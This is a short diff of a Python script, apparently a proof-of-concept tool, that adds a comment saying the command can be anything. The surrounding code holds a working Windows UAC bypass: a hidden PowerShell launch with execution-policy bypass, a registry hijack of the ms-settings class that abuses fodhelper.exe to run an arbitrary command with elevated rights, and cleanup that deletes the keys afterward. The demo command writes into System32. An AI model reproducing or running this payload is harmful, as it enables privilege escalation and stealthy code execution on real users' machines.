@@ -8,6 +8,7 @@ import os
 
 payload = r"""$payload="powershell.exe -w h -NoP -NonI -Exec Bypass -enc $command";reg add "HKCU\Software\Classes\.hacker\Shell\Open\command" /d $payload /f;reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".hacker" /f;fodhelper.exe;Start-Sleep -s 3;reg delete "HKCU\Software\Classes\.hacker\" /f;reg delete "HKCU\Software\Classes\ms-settings\" /f;"""
 
+# COMMAND CAN BE ANYTHING, THIS IS JUST A PROOF OF CONCEPT
 command = r"New-Item C:\Windows\System32\WOWZERS.txt"
 
 random_payload = ''.join(random.choices(string.ascii_letters, k=random.randint(1, 20)))
